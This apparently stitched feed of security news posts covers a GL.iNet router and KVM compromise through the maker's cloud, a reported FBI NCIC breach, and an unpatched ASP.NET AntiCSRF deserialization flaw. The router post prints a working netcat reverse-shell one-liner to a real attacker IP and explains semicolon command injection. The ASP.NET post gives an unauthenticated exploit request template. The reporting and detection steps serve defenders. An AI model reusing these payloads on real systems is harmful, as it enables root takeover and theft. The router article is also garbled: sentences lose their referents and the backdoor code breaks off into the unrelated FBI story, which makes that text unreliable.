Routers and KVMs took root commands and malware from the maker’s own cloud, with signs on 166 of 199 routers one firm checked. Owners had the abused feature turned off. The hole was 715 days old.

GL.iNet makes small travel routers that fit in a jacket pocket, the kind you take along on a trip. You plug one in at a hotel or a holiday rental, and your laptop and phone go through your own little network instead of straight onto the hotel WiFi. The company also makes home routers, and a line of KVM devices called Comet.

# TL;DR

A KVM over IP is a small box that you plug into the HDMI and USB ports of a computer. From your browser you then see that computer’s screen and use its keyboard and mouse as if you were sitting in front of it, even while it is still starting up. That is handy when the computer is a server in a closet, or your work PC at the office while you are at home.

To manage those devices from wherever you are, GL.iNet has a cloud service called GoodCloud. You link your router or KVM to your account, and from that moment on the device keeps a connection open to GL.iNet’s servers and waits for instructions. You change a setting in the app, the cloud sends a message down that connection, and your device does what the message says.

On the KVMs, that cloud service is switched on by default, GL.iNet’s own documentation says so. And according to the company’s security notice, some KVMs already had it running before their owner had even linked them to an account.

So the device listens to the cloud. On November 20, 2026, GL.iNet announced that someone had used a hole in that cloud to put malware on routers and KVMs of its customers.

It took two holes to get there, one in the cloud and one on the router.

The first hole was in the cloud itself. The messages between GoodCloud and your device travel over MQTT, a protocol made for devices that send short messages back and forth with a server, and GL.iNet runs it on a server called EMQX. Your device subscribes to topics, the channels its own messages come in on, and the server is supposed to check who is allowed to send what to which topic. That check was set up wrong, which GL.iNet calls a configuration error. So one device could send management messages to someone else’s device, without being allowed to.

GL.iNet’s own write-up says what an attacker needed for that. One GL.iNet device of their own on GoodCloud, and the MAC address of your device, the hardware address of its network card. An attacker can go through those MAC addresses in large batches, which the write-up calls enumerating them in bulk. The cloud version with the flaw is v3.19.13, and the fix is v3.19.14.

The second hole was on your router, in the program that receives those messages, GL.iNet’s cloud client. It comes in a package called gl-sdk4-cloud, and one part of it handles AstroWarp. AstroWarp is GL.iNet’s SD-WAN feature, software that ties networks in different places together over the internet, an office and a home office for example.

When a cloud message called virtual_ip_info comes in, the client takes three fields out of it, mac, virtualIp and ip, and fills them into a firewall rule:

1

iptables -t nat -A %s -d %s -j DNAT --to-destination %s

The researchers who took this client apart found a part of that code, a branch, with the label “Manually add ip”. When the mac field is empty, the client hands that line straight to the shell with os.execute. It does not check what is in virtualIp or ip, and it does not put quotes around them.

In a shell, a semicolon ends one command and starts the next one. So when the ip field says 127.0.0.1; with any command behind it, the router runs that command. As root, the administrator account that can do anything on the device.

The client also never checks if AstroWarp is even in use. GL.iNet confirms that in its own report: the flaw worked “even when AstroWarp was turned off.” The researchers had the AstroWarp setting on record for 193 of their routers. On all 193 it was off, and the attack went through anyway.

Those researchers are RemoteToHome Consulting, a firm that sets up networks and VPNs for digital nomads, expats and small businesses, and manages a large number of GL.iNet routers for them. They also looked at when this code arrived. The earliest firmware they found it in is 4.7.0 for the GL-MT3000, released on December 5, 2024. The version before it, 4.6.9, did not have it. So the hole was there 715 days before the attack.

This is what the attack looked like on one router. The owner of a GL-AXT1800 on firmware 4.8.3 posted the list of running processes on GL.iNet’s forum, and this line was in it:

1

sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 43104 >/tmp/f;sleep 3;done)

The first part is a firewall rule that does no harm, pointed at 127.0.0.1, the router’s own address. After the semicolon comes the attack.

mkfifo /tmp/f makes a named pipe, a special file that passes data from one program to another. /bin/sh -i starts a shell you can type commands into. nc, short for netcat, opens a connection to 170.39.226.219 on port 43104. From then on, what the attacker types on their side goes through that pipe into the shell on your router, and what the shell answers goes back over the same connection.

That is a reverse shell. Your router is the one that makes the call, out to the attacker. So no port has to be open on your router, and to your firewall it is ordinary outgoing traffic, the same kind as when you open a website. The while true loop with the sleep 3 makes sure that when the connection drops, the router calls back three seconds later.

The researchers also read GoodCloud’s own device logs for their routers. The attacker’s messages had their own recognizable form, and the first router reply to one of them shows up on November 19. The big wave came on November 20, from 20:06 UTC until 08:04 UTC the next morning. About twelve hours, one router model and firmware version after the other.

By November 23 they had checked 199 routers. On 166 of them they found signs of the attack:

  • → 24 with a root shell to 170.39.226.219 still running, or still trying to reconnect
  • → 93 where the attacker’s command had run and nothing else was found
  • → 49 with an older backdoor installed and running, more on that below

On the other 33 they found nothing, and 15 of those had been restarted since November 20. The shell only exists in memory, so a restart takes most of the traces with it.

These are the researchers’ own routers and the ones they manage, and all of them had GoodCloud on. So 166 out of 199 does not mean that 83 percent of all GL.iNet routers are infected. It gave a command that looks for the connection itself:

netstat -tnp | grep '170.39.226.219'

That one searches for the address the shell calls, so it finds the connection no matter what the process is called.

Then the traffic started. That one small box talked to about 1,450 different IP addresses on November 19 and about 1,800 on November 20. Before that, it was about 20 a day. He describes them as random residential addresses, so internet connections of other people’s homes. On top of that, the KVM contacted api.trongrid.io, an API for the TRON blockchain, about 1,000 times in 36 hours. What all that traffic was for is still unclear.

The server that gives the malware its orders sits at gl-inet.top. Read that name twice. It looks like GL.iNet’s own, and it points to 66.245.219.252. According to a forum user, it was registered on November 16, three days before this KVM was hit.

The script itself installs a program called gl-helper and a helper called gb, and makes sure they come back after a reboot, with startup scripts and a scheduled job that runs at three-minute intervals. Its process is called crond -i /tmp/.log, so at a glance it looks like the normal task scheduler.

The script also swaps netstat, the command you would use to see the network connections, for a small script of 122 bytes that leaves 66.245.219.252 out of the list. So the moment you go looking for that connection, the tool you look with leaves it out. And it has an option to add an SSH key, so the attacker can log in directly.

And a KVM is plugged into a computer. That is what it is for: whoever controls the KVM sees that screen and types on that keyboard. By changing the startup arguments of RTTY, that check could be skipped. The device then connects to a terminal server of the attacker, and the attacker gets root. The researchers list 65.20.71.131 as exactly that, a rogue RTTY relay.

While owners were searching their routers for traces of the November attack, they found something else: the older backdoor from the list above.

It starts with five lines added to the top of /etc/init.d/urandom_seed, a normal startup script on these routers:

1
2
3
4
5

cp /usr/bin/lua /usr/bin/monitord
cp /bin/ulogd /var/run/monitord.pid

item.title: FBI NCIC Database Police Search at Traffic Stops Reportedly Hacked With 19.3 Million Records Inside
item.description:
Hackers reportedly got into the FBI database police search 7 million times a day: 19.3 million records on fugitives and stolen guns. Missing children are in it too. The FBI has not said how, or since when.

The database is called the National Crime Information Center, or NCIC. When a police officer in the US stops a car and runs the driver’s name or the license plate, the answer comes from here, within milliseconds. That answer shows the officer a warrant for the driver, a report that the car is stolen, or a court order that keeps this person away from someone. According to the FBI, the system serves more than 100,000 criminal justice and law enforcement partners, 24 hours a day, 365 days a year.

# TL;DR

On Friday, November 20, a US news network reported that the FBI was investigating a break-in into that system. It cited two people briefed on the investigation. The next morning, three sources told another network that hackers had breached NCIC, and that the FBI was trying to find out where they got in. A law enforcement source confirmed the hack to a third network.

The FBI itself has not confirmed any of it. It declined to comment to some outlets and did not respond to others. What is known about the break-in comes from people who spoke without giving their names. On Saturday, the president also said that NCIC was targeted in a hack, without giving details. That is how this post treats it: reported, not confirmed.

The news came after a series of outages at US banks, the NSA and the air traffic control system of the FAA. Officials of the administration blamed those on routine upgrades and fixes, and there was no immediate sign that the FBI incident was related.

The FBI started NCIC in 1967 with five files and 356,784 records. In the beginning, 15 state and city computers were connected to it. Within four years, the system reached all 50 states.

Today NCIC has 22 files. Seven are about property: stolen articles, boats, guns, license plates, securities, vehicles, and vehicle and boat parts. The other 15 are about people:

  • → Wanted Person and Foreign Fugitive

  • → Missing Person and Unidentified Person

  • → Protection Order, and Extreme Risk Protection Order, the court order that temporarily stops someone from buying or owning a gun

  • → the National Sex Offender Registry

  • → Identity Theft

  • → Gang, Violent Person and Immigration Violator

  • → NICS Denied Transaction, for people who were refused when they tried to buy a gun

  • → Threat Screening Center, Protective Interest and Supervised Release

Police departments and other agencies across the country put those records in, and they have to change and remove their own records as well. The FBI’s Criminal Justice Information Services Division, CJIS, keeps them. In its review of fiscal year 2025, the FBI wrote that the number of records in NCIC grew each month, to an all-time high of over 19.3 million. The system was available 99.8 percent of the time.

The same review gives an example of how NCIC is used. In 2024, officers of US Customs and Border Protection at a border crossing came across a vehicle that NCIC flagged as stolen. It had been taken in a midwestern state, and according to the authorities, the driver had come from there to the border in it. NCIC also showed an active felony warrant from a western state, for the alleged armed robbery of a car during a meeting set up through an online marketplace. The officers checked both records in NCIC and took the driver into custody.

Then there are the missing. In 2025, agencies entered 498,038 missing person records into NCIC, and 323,767 of them were children under 18. In the same year, agencies took 443,390 missing person records out again, by canceling or clearing them. At the end of 2025, 88,093 were still open. Next to them sit 8,509 records of people whose name is unknown, and 8,253 of those people are dead. 218 are alive and unable to say who they are, such as a person with amnesia or a baby.

Across 2025, agencies searched NCIC by name 2,674,486,640 times. That is more than 7 million name searches a day.

The FBI has not said what happened inside. It has not said how the attackers got in, who they are, or what they copied.

A retired FBI supervisory special agent told one network that investigators will go through IP logs and metadata to find the entry point. He named three possible ways in: a compromised password of one of the more than 100,000 users, a breached state terminal, or a third-party vendor. According to him, roughly 56 state terminals pass the data on to hundreds of thousands of computers in patrol cars. He also said there was no indication yet that records were altered or that the system was down.

The FBI lists its own protections for the system. It encrypts the information and makes each agency prove who it is before it gets access. Each agency has to check its own records regularly, and periodic audits check that agencies follow the security rules.

A former FBI official who led cybercrime investigations said he worries about two things: what the attackers could read, and whether they could make the information officers rely on wrong.

The FBI’s own rules show how much depends on a correct record. When NCIC gives a hit, a match on a name or a plate, the police agency first has to confirm that the record is accurate and up to date. Only then can officers act on it.

One of the 15 person files is the Violent Person File. It holds people with earlier violent convictions who have said they intend to commit violence against police officers or others who work in criminal justice. According to the FBI, officers who get a hit in that file can approach the person more carefully.

The Violent Person File grew by more than 93,000 records in fiscal year 2025. In that same year, an advisory board of police and justice officials recommended a change to the FBI Director. NCIC should show results from this file first, before the Wanted Person File and the rest.

So far, no report says that a record was changed. The FBI has not said anything about it either way.

On Thursday, November 19, after FBI officials had learned of the incident, FBI Director Kash Patel was on television talking about the bureau’s cybersecurity work. According to the network that first reported the hack, he spoke about an operation that had ended months earlier as if it was still running. “Other administrations could have made these updates, but they didn’t,” he said.

Two days later, President Trump was asked about the hack in a phone interview. “I will say that it’s not good. I don’t like that,” he said. Then he suggested, without evidence, that it might bring out things about the investigation into Russian interference in the 2016 election. He also mentioned his 2019 phone call with the president of Ukraine.

NCIC holds warrants, missing people, stolen property and court orders. One of the networks that covered the interview pointed out that NCIC would not hold information on those investigations.

This is the third FBI system reported hit this year.

In March, the FBI said it was investigating “suspicious activities” on an internal system that holds sensitive information about surveillance operations and investigations. In a notice to Congress, the Justice Department later called it a major incident under FISMA, the US law that sets the security rules for federal computer systems.

In September, a group called ShinyHunters said it had broken into FBIJobs.gov, the FBI’s recruitment website. It claimed data on almost all FBI agents and on people who had applied for a job there. The FBI said it was aware of claims of “unauthorized activity affecting FBIjobs.gov” and was investigating. The group gave samples of 5,000 agent records to journalists, who confirmed they were genuine.

On October 8, the FBI arrested a Canadian cybersecurity executive in its investigation into the group. The complaint in his case is sealed, so what he is accused of doing is not public.

Nothing so far connects the NCIC break-in to that group, and no group has claimed it.

NCIC has been broken into before. On April 5, 2001, the director of the FBI’s National Infrastructure Protection Center at the time testified before a committee of the US House of Representatives. He talked about a group the FBI called the Phonemasters. According to his testimony, they got into the computer systems of MCI, Sprint, AT&T and Equifax, “and even the National Crime Information Center.”

Their method needed very little technology. They went through trash for old phone books and technical manuals. They used what they found to trick employees into giving up their login names and passwords, and then they logged in with those.

One member downloaded thousands of calling card numbers from one of those phone companies and sold them to someone in Canada. From there the numbers went to Ohio, then to Switzerland, and ended up with organized crime groups in Italy. In September 1999, two of the group’s leaders were sentenced after pleading guilty: one to two years in prison, the other to 41 months.

NCIC was also in the middle of changes when the November break-in happened. In its review of fiscal year 2025, the FBI wrote that NCIC was in extensive testing before its final move to the cloud in fiscal year 2026. The division that runs it had already moved 95 percent of its IT systems to the cloud.

Access to NCIC grew as well. The FBI wrote that access had historically been limited to criminal justice agencies that meet a strict set of requirements. In fiscal year 2025, more than 37,000 licensed gun dealers got a way to check firearm serial numbers against the stolen gun records in NCIC. They do that through a web portal of the FBI’s background check system for gun buyers. When there is a match, the agency that entered the record gets a notice.

None of this explains how the attackers got in. The FBI has not said, and these changes may have nothing to do with it.

In cybersecurity, attribution is one of the hardest problems. IP addresses can be spoofed. Tools can be shared. What is known today is small: the FBI is investigating a break-in into NCIC, FBI officials knew about it by Thursday, November 19, and the FBI has not said what was taken or changed. Nothing public says yet who is behind it.

What stays open is the question an officer has at the side of the road: whether the record that comes back on the screen is still right. For the families behind 88,093 open missing person records, it is the same question.

Want to see how much an attacker can find before touching a system? Run Sherlock on your own username and count what comes back.

item.title: ASP.NET Websites Get Taken Over Through the Module That Was Supposed to Protect Them
item.description:
Hackers took over a Windows web server with one request, and a cookie with a 1 in it is enough. The site had added a security module to stop attacks, and that module let them in. It dates from 2008, it will never be fixed, and an exploit for it is now on GitHub.

# TL;DR

Attackers got into a web server running ASP.NET, Microsoft’s framework for building websites. Investigators from Mandiant and Google Cloud’s FLARE team came in to find out how. On November 4 they had the answer: a small library called Idunno.AntiCsrf.dll.

That file was the security module the website had installed to stop attacks.

On November 18, Mandiant published what they found. The flaw got a number, CVE-2026-131914, and a score of 9.3 out of 10. The researchers had also seen it used in attacks. Whose server it was, how many other servers still run this module, and who is behind it, they do not say.

The module protects against something called CSRF, Cross-Site Request Forgery. Say it is 2008 and you are logged in to the portal at work. In another tab you open some other website, and that page quietly sends a form to your portal in the background. Your browser adds your login cookie to that request by itself. The portal sees a request from you, logged in, and carries it out. Your password or your email address can be changed that way while you are reading something else in the other tab.

Since 2020, Chrome no longer sends such cookies with forms from other websites by default, unless the site allows it.

The defense against CSRF is a secret. The website puts a random value in a hidden field in its own forms, and checks that the same value comes back. The other website cannot read that value, so its forged form shows up without it and gets refused.

AntiCSRF did this with a trick called double submit. When a page with a form went out, the module gave the browser a temporary cookie with a random value in it, a GUID. The same value went into a hidden form field called __CSRFTOKEN. When the form came back, the module compared the two. Same value, the request went through. Different value, the module threw an error or sent the visitor to an error page.

Before that value went into the hidden field, the module packed it with ObjectStateFormatter, a serializer that comes with ASP.NET. When the form came back, it unpacked the field again and then compared.

Two developers published it on Microsoft’s CodePlex in December 2008. It was downloaded 548 times by early 2011, and its own page warned it should not be the only protection.

The last version, 0.9.1 Beta, is dated December 15, 2008. The project page explains why the module was there in the first place. In those days, the normal way to protect an ASP.NET form against CSRF was ViewState together with a setting called ViewStateUserKey. That only works with ViewState switched on and a session to tell users apart. AntiCSRF was for sites that did not want either. All it asked for was cookies in the browser.

Installing it was easy. You dropped the DLL into the bin folder and added one line to Web.config:

1

<add name="AntiCSRF" type="Idunno.AntiCsrf.AntiCsrfModule, Idunno.AntiCsrf"/>

From that moment on, the module stood in front of the WebForms pages of the site.

IIS, the web server built into Windows, runs an ASP.NET website inside a process called w3wp.exe. A request goes through a fixed row of steps before it reaches the page, and a module like this one can hook into those steps. AntiCSRF hooks into an early one, PreRequestHandlerExecute. At that moment the page has not started yet. Page_Load has not run, and the developer’s own code for that page has not run either.

There, the module looks at a POST request and checks two things: is there a CSRF cookie, and is there a CSRF form field. Neither may be empty, and that is it. Whether the cookie looks anything like the random value it is supposed to hold, it does not check.

Then it takes the form field and unpacks it with a fresh ObjectStateFormatter, made without any arguments. Made like that, it rebuilds whatever the data tells it to rebuild, without a key and without checking a signature. Only after that does the module compare the result with the cookie.

Unpacking data back into objects is called deserialization, and in .NET it is dangerous with data from outside. Some object types run code while they are being rebuilt. Chain the right ones together and the last one runs a command the attacker chose. That chain is called a gadget chain, and the free tool ysoserial.net builds them, also for ObjectStateFormatter. The researchers do not say which chain the attackers used.

So the attack needs a cookie with a 1 in it, a gadget chain in the form field, encoded in Base64, and one POST request to a page. The advisory even uses that cookie as its own example. The request looks like this:

1
2
3
4
5

POST /any-page.aspx HTTP/1.1
Cookie: __CSRFCOOKIE=1
Content-Type: application/x-www-form-urlencoded
__CSRFTOKEN=[Base64 ObjectStateFormatter gadget chain]

The module unpacks the field, and the gadget chain runs inside w3wp.exe with the rights of the website. Then the module gets to its check, sees that 1 does not match, and throws its error or sends a redirect. The server answers with a 500 or a 302. By then, the attacker’s code has already run. The researchers call it a complete compromise of the web server.

Logging in is not needed. Pages that ASP.NET locks behind a login in Web.config are out of reach, because that check runs earlier. But a page a visitor can open without logging in is enough, and so is a page that only checks the login inside Page_Load. A site with a login has at least one page that opens without an account: the login page itself. One of the public exploits ran its commands through /Login.aspx.

The page does not even need a form on it. The module skips only the pages the developer opted out by hand, with a SuppressCsrfCheck attribute or an ISuppressCsrfCheck interface.

The researchers found one more bug while they were in there. Leave the csrfSettings section out of Web.config, and a mistake in the settings code renames the form field to RaiseException. The module then reads its token from a field called RaiseException, and the same unpacking runs on whatever arrives in it.

ObjectStateFormatter is the same serializer ASP.NET uses for ViewState, the hidden __VIEWSTATE field that WebForms pages send back and forth each time a form goes to the server. Microsoft knows how dangerous that field is when it goes unchecked.

ASP.NET can sign ViewState with a MAC, a checksum made with the server’s secret key, and throw out anything that does not match. The setting for that is called EnableViewStateMac, and for years developers could switch it off.

In July 2010, a security program manager at Microsoft wrote in MSDN Magazine about the advice to turn the MAC off for speed, and told developers not to follow it. In December 2013, Microsoft released an optional update, KB 2905247, that blocks the setting. On September 9, 2014, the company pushed it out through Windows Update, and from then on ASP.NET 1.1 up to 4.5.2 refused the setting. The ASP.NET team wrote that it is never safe to turn the MAC off, and that a site with the MAC off stays open to remote code execution.

AntiCSRF calls ObjectStateFormatter itself, without a key, on a field it made itself. What Microsoft forced onto ASP.NET servers in 2014 never touches it. And this was the module made for sites that wanted to stay away from ViewState.

The same serializer has been used to break into servers before. Each time, the attackers needed something first.

  • → February 2020, Exchange. Each Exchange installation came with the same validationKey and decryptionKey in its web.config. With those known keys, an attacker could make the server unpack crafted ViewState and run code as SYSTEM. Microsoft fixed it as CVE-2020-0688. The attacker still had to log in to the Exchange Control Panel, although any account would do.

  • → December 2024. Microsoft saw attackers send malicious ViewState to an IIS server, signed with a machine key someone had published online. It loaded the Godzilla post-exploitation framework. Microsoft counted more than 3,000 public keys that could be used the same way.

  • → July 2025, SharePoint. During the ToolShell attacks, the attackers dropped a web shell called spinstall0.aspx on servers. Its job was to read out the MachineKey. Microsoft told SharePoint admins to replace those keys after patching.

With AntiCSRF, the attacker needs neither a key nor an account.

A fix will not come. CodePlex has been retired, the project has no maintainer, and 0.9.1 Beta from 2008 is the last version there is. With no vendor to report the flaw to, the researchers requested the CVE themselves on November 11 and published a week later. Their advice is to remove the module.

The CVE record does not agree with itself. The score from the researchers marks the flaw as attacked. Ten minutes after the record was published, CISA added its own rating to the same record, and that one says exploitation: none. As of November 23, the flaw was also not on CISA’s list of known exploited vulnerabilities, the list US federal agencies have to patch from.

On November 24, two exploits for it showed up on GitHub. One unpacks a harmless object and never sends a request through the module. The other runs commands. Its maker writes that it worked on November 23 against the original 2008 DLL on IIS 10, without logging in.

548 downloads by early 2011 sounds small. In November 2026 the module was still running on a server, and the attackers found it before the researchers did.

What you can do if you run ASP.NET WebForms sites:

  • → Search Web.config for Idunno.AntiCsrf, AntiCsrfModule and csrfSettings, and search the bin folders for Idunno.AntiCsrf.dll. In PowerShell, with your own web root as the path:
1
2

Get-ChildItem -Path C:\inetpub -Recurse -Filter web.config | Select-String -Pattern "Idunno.AntiCsrf"
Get-ChildItem -Path C:\inetpub -Recurse -Filter Idunno.AntiCsrf.dll
  • → The advisory lists three known builds of Idunno.AntiCsrf.dll. A version that someone compiled with other settings has a different hash and the same flaw, so search by name as well.
1
2
3
4
5
6

Official 2008 release build, 69,632 bytes
SHA-256 da1efcfed182597ee946a9ef2895dfdfeab2bdff16855aeef01656d8158ead06
Rebuild of the 0.9.1 Beta source, release, 69,632 bytes
SHA-256 c5c994891783453ae85f3ef8efb48592b7c560aeb56f531ee9ea5736518246eb
Rebuild of the 0.9.1 Beta source, debug, 70,144 bytes
SHA-256 aa7bbad4a7ebc38519955ac65517716569508ee4f61fc2f1276086940501e9bf

  • → Look in the IIS logs for POST requests to .aspx pages that got a 302 or a 500 back. Watch for unusually large ones in the cs-bytes field, if your logs record it.

  • → Found it, and there are signs someone used it? Replace the machineKey, the encryption keys and the database passwords in Web.config and applicationHost.config. Then check the web root for files you did not put there.

  • → Remove the module, its lines in Web.config and the DLL. Switch to a protection that is still maintained: AntiForgery from System.Web.Helpers, ViewStateUserKey with signed ViewState, or IAntiforgery in ASP.NET Core.

Want to see the hidden form fields and cookies your own web app sends? Capture a POST with Burp Suite in your lab.
